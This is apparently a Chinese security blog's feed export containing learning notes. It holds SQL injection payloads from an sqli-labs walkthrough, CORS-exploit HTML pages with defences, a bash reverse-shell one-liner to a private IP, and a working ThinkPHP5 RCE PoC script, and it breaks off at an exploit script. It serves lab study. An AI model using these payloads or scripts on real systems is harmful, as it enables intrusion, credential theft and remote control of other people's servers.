title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>输入admin’) and extractvalue(1,concat(‘<del>‘,(select database()),’</del>‘))#。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/85cb6e06c9b94c8ebe82fb03f0200028.png" alt="在这里插入图片描述"></p><h2 id="3、获取表名"><a href="#3、获取表名" class="headerlink" title="3、获取表名"></a>3、获取表名</h2><p>admin’) and extractvalue(1,concat(‘<del>‘,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),’</del>‘))#，更改limit可以获取后面的表名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7c25184237ca42f988372b531c7b9c8d.png" alt="在这里插入图片描述"></p><h2 id="4、获取列名"><a href="#4、获取列名" class="headerlink" title="4、获取列名"></a>4、获取列名</h2><p>admin’) and extractvalue(1,concat(‘<del>‘,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),’</del>‘))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f64a98f3845847c993686fa1e06024c0.png" alt="在这里插入图片描述"></p><h2 id="5、获取用户名和密码-1"><a href="#5、获取用户名和密码-1" class="headerlink" title="5、获取用户名和密码"></a>5、获取用户名和密码</h2><p>admin’) and extractvalue(1,concat(‘<del>‘,(select username from users limit 0,1),’</del>‘))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/31b7251297eb41ac82f13b780aef0ef6.png" alt="在这里插入图片描述"></p><h1 id="五、less-14"><a href="#五、less-14" class="headerlink" title="五、less-14"></a>五、less-14</h1><h2 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>经过测试，发现与十三关类似，这里是报错的双引号盲注，改成admin”就行。</p><h2 id="2、获取数据库信息-2"><a href="#2、获取数据库信息-2" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>admin” and extractvalue(1,concat(‘<del>‘,(select database()),’</del>‘))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c54072f0adb043679f8692f62dd00f02.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-1"><a href="#3、获取表信息-1" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>admin” and extractvalue(1,concat(‘<del>‘,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),’</del>‘))#，更改limit可以获取后面的表名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b03bcd30cac34651a08a624c01c96728.png" alt="在这里插入图片描述"></p><h2 id="4、获取列名-1"><a href="#4、获取列名-1" class="headerlink" title="4、获取列名"></a>4、获取列名</h2><p>admin” and extractvalue(1,concat(‘<del>‘,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),’</del>‘))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a86f3f381c0a48a2822f4318234dc431.png" alt="在这里插入图片描述"></p><h2 id="5、获取用户名和密码-2"><a href="#5、获取用户名和密码-2" class="headerlink" title="5、获取用户名和密码"></a>5、获取用户名和密码</h2><p>admin” and extractvalue(1,concat(‘<del>‘,(select username from users limit 0,1),’</del>‘))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/68948cbaa75c40d9a0c4c48c78b83146.png" alt="在这里插入图片描述"></p><h1 id="六、less-15"><a href="#六、less-15" class="headerlink" title="六、less-15"></a>六、less-15</h1><h2 id="1、尝试判断-1"><a href="#1、尝试判断-1" class="headerlink" title="1、尝试判断"></a>1、尝试判断</h2><p>输入了admin’、admin”以及加上各种括号都不显示，可能是延迟注入，这里为单引号盲注。</p><h2 id="2、获取数据库信息-3"><a href="#2、获取数据库信息-3" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>输入admin’ and if(substr((select database()),1,1)&#x3D;’s’,sleep(5),1)#&#x3D;&#x3D;也可以用ascii判断&#x3D;&#x3D;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a1d5b30829b847ed9950a0208c20a642.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-2"><a href="#3、获取表信息-2" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>输入admin’ and if((select count(*)from information_schema.tables where table_schema&#x3D;database())&#x3D;4,sleep(5),1)#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b422b787edec47729611a441bb3bf127.png" alt="在这里插入图片描述"></p><h1 id="七、总结与小记"><a href="#七、总结与小记" class="headerlink" title="七、总结与小记"></a>七、总结与小记</h1><p>本篇文章是sql-lib的11-15关，如果有什么问题请大家海涵，有什么问题请大家评论。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> SQL注入靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> SQL注入靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CORS漏洞的学习</title>
      <link href="/2022/08/08/cors_study/"/>
      <url>/2022/08/08/cors_study/</url>
      
        <content type="html"><![CDATA[<p><strong>声明：本篇文章仅代表本人在学习过程中的笔记记录，用于学习交流，不得用于其他用途。</strong><br><img src="http://120.48.107.243:9090/blog/2023/04/01/a6264243d7c6452f941292962a726934.png" alt="在这里插入图片描述"><br><strong>（图片来源于安全客。)</strong></p><h1 id="一、cors"><a href="#一、cors" class="headerlink" title="一、cors"></a>一、cors</h1><h2 id="1、什么是cors"><a href="#1、什么是cors" class="headerlink" title="1、什么是cors"></a>1、什么是cors</h2><p>CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。<br>（&#x3D;&#x3D;PS：真可爱。&#x3D;&#x3D;）<br>CORS的基本原理是，第三方网站服务器生成访问控制策略，指定用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据</p><h2 id="2、cors跨域漏洞"><a href="#2、cors跨域漏洞" class="headerlink" title="2、cors跨域漏洞"></a>2、cors跨域漏洞</h2><p><strong>CORS跨域漏洞的本质是服务器配置不当</strong>，即Access-Control-Allow-Origin取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。导致攻击者可以构造恶意的脚本 , 诱导用户点击获取用户敏感数据<br>（&#x3D;&#x3D;PS：大部分漏洞的出现都是服务器配置不当。&#x3D;&#x3D;）<br>这里要注意的是，我们也可以测试下带有<code>Access-Control-Allow-Origin: *</code> 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p><strong>（PS：如果有上面两行，则不存在该漏洞。）</strong><br><strong>CORS中关键的几个响应头字段如下：</strong></p><ul><li>Access-Control-Allow-Origin：指定哪些外域可以访问本域资源；</li><li>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送Cookie。仅当设置为true时，才会发送Cookie；默认是false</li><li>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET、POST、PUT、DELETE等）来访问资源；</li><li>Access-Control-Allow-Headers：指定可以在请求报文中添加的HTTP头字段；</li><li>Access-Control-Max-Age：指定超时时间；</li></ul><p>下面以一个具体的示例 , 学习cors跨域漏洞</p><p>靶场项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tangxiaofeng7/SecExample.git</span><br><span class="line">cd SecExample</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>靶场地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自行搭建。</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/70bbbea11eca45ff952d8d6bae6247cf.png" alt="在这里插入图片描述"></p><p>可以很明显的看到个人的敏感信息 , 接下来抓包探测是否存在cors</p><p>漏洞探测</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/0b0ac1bcb52f4cb8a5ba9eaa77629d49.png" alt="在这里插入图片描述"></p><p>从响应包中可以看到存在cors跨域漏洞</p><p>漏洞利用</p><p>利用脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 当前窗口加载完毕,执行cors函数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> <span class="title function_">cors</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 初始化一个xhttp变量</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> xhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = <span class="title function_">alert</span>(</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">this</span>.<span class="property">responseText</span></span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        xhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://192.168.23.132:8080/cors1&quot;</span>, <span class="literal">true</span>);   <span class="comment">// 只需要修改存在cors的url即可</span></span></span><br><span class="line"><span class="language-javascript">        xhttp.<span class="property">withCredentials</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        xhttp.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将我们的利用脚本放在web服务上 , 然后把整个url发给受害者 , 诱惑他点击url</p><p>我们假装受害者访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.159/1.html</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/6dc08367f4d54d288367feedc88d5eb3.png" alt="在这里插入图片描述"></p><p>（&#x3D;&#x3D;PS：整体来说，这个漏洞也是获取敏感信息的，如果没有敏感信息，即使存在也没什么用。&#x3D;&#x3D;）</p><h2 id="3、cors漏洞危害"><a href="#3、cors漏洞危害" class="headerlink" title="3、cors漏洞危害"></a>3、cors漏洞危害</h2><p>攻击者构造恶意的html页面，利用链接诱导受害者进行点击，从而获取到受害者的敏感信息</p><p>相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有</p><p>类型的HTTP请求，功能完善</p><h2 id="4、cors挖掘思路"><a href="#4、cors挖掘思路" class="headerlink" title="4、cors挖掘思路"></a>4、cors挖掘思路</h2><p>CORS的漏洞主要看当我们发起的请求中带有<code>Origin</code>头部字段时，服务器的返回包带有CORS的相关字段并且允许<code>Origin</code>的域访问。</p><p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。</p><p>首先是自动在HTTP请求包中加上<code>Origin</code>的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为<code>Origin:foo.example.org</code>的Enable框。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/68b16a7ea9f4d9dda1e5e686bc3eb349.png" alt="image-20220905010051026"></p><p>然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在BurpSuite的Proxy模块下的HTTP history来筛选带有CORS头部的值。</p><p>我们的条件可以是如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Origin: foo.example.org</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p><strong>案例介绍</strong></p><p>在请求包加上Origin：evil.com 如果返回的Access-Control-Allow-Origin含有evil.com那么就说明存在cors</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/f97579f0647db1d61556ad294d09eaa4.png" alt="image-20220905010752375"><br>（&#x3D;&#x3D;PS：首先是将理论转换为自己的知识，然后再运用到实际当中。&#x3D;&#x3D;)<br>构造poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;cors()&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">cors</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            payload = <span class="string">&#x27;1=1&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;https://xxxxxx&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>(payload);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/4ad31ee7aa11b15752d5cf1adf5d6168.png" alt="image-20220905010824792"></p><p><strong>（PS：这一块似乎是示例演示。）</strong></p><h2 id="5、cors和csrf的区别"><a href="#5、cors和csrf的区别" class="headerlink" title="5、cors和csrf的区别"></a>5、cors和csrf的区别</h2><p><strong>一般有CORS漏洞的地方都有CSRF。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。</span><br><span class="line">浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。</span><br><span class="line"></span><br><span class="line">相同点：都需要第三方网站；都需要借助 Ajax的异步加载过程；一般都需要用户登录目标站点；</span><br><span class="line"></span><br><span class="line">不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。</span><br></pre></td></tr></table></figure><h2 id="6、防御方案"><a href="#6、防御方案" class="headerlink" title="6、防御方案"></a>6、防御方案</h2><ol><li>不要配置”Access-Control-Allow-Origin” 为通配符 “*” ,而且更重要的是，要严格效验来自请求数据包中的”Origin” 的值，当收到跨域请求的时候，要检查”Origin” 的值是否是一个可信的源，还要检查是否为 null </li><li>避免使用”Access-Control-Allow-Credentials: true” ；</li><li>减少 Access-Control- Allow-Methods 所允许的方法  ；</li><li>若非必需则不开启CORS。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> CORS漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> CORS漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（终）</title>
      <link href="/2022/08/04/python_finally/"/>
      <url>/2022/08/04/python_finally/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135856271.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python编写poc和exp的知识。&#x3D;&#x3D;</p><h1 id="一、poc和exp的区别"><a href="#一、poc和exp的区别" class="headerlink" title="一、poc和exp的区别"></a>一、poc和exp的区别</h1><p>poc</p><ul><li>漏洞验证<br>exp</li><li>漏洞利用<br>他们两个的本质区别是使用的 <strong><code>payload</code></strong> 不同 , 比如我一个远程命令执行的漏洞 , 当我的payload是 id&#x2F;whoami这样的命令时 , 那么我整个脚本或者工具 , 就是poc , 因为我只是让他执行一下简单的系统命令来判断目标是否存在这样的漏洞 , 如果我的payload是一串 反弹shell的系统命令<br>如 <code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.101.48/5656 0&gt;&amp;1</code> , 那么我整个工具就是一个exp , 可能这个poc和exp其他的代码都一模一样 , 只有要执行的命令 , 也就是这个命令 , 即 payload 不同 , 决定了这个脚本是poc还是exp</li></ul><h1 id="二、编写thinkphp5-rce的poc"><a href="#二、编写thinkphp5-rce的poc" class="headerlink" title="二、编写thinkphp5 rce的poc"></a>二、编写thinkphp5 rce的poc</h1><p>环境自己使用vulhub搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/thinkphp/5.0.23-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>使用 argparse 模块接收用户参数 , 加上banner信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, func=<span class="string">&quot;phpinfo&quot;</span></span>):</span><br><span class="line">    <span class="comment"># 1.发请求</span></span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index.php?s=captcha&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080/index.php?s=captcha&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,ja;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;func&#125;</span>&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">&quot;-1&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(full_url, headers=headers, data=data,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 请求失败&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 2.判断是否存在漏洞</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;PHP Extension Build&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span> 存在远程代码执行漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 不存在远程代码执行漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">                                                version: 0.0.1</span></span><br><span class="line"><span class="string">                                                author:   xxx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="comment"># 使用argparse去解析命令行传来的参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;thinkphp5 rce poc&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        python3 tp5poc.py -u http://192.168.1.108</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    <span class="comment"># 添加参数</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)</span><br><span class="line">    <span class="comment"># 把参数的值解析到对象中</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url)</span><br></pre></td></tr></table></figure><h1 id="三、编写thinkphp5-rce的exp"><a href="#三、编写thinkphp5-rce的exp" class="headerlink" title="三、编写thinkphp5 rce的exp"></a>三、编写thinkphp5 rce的exp</h1><p>使用 argparse 模块接收用户参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> 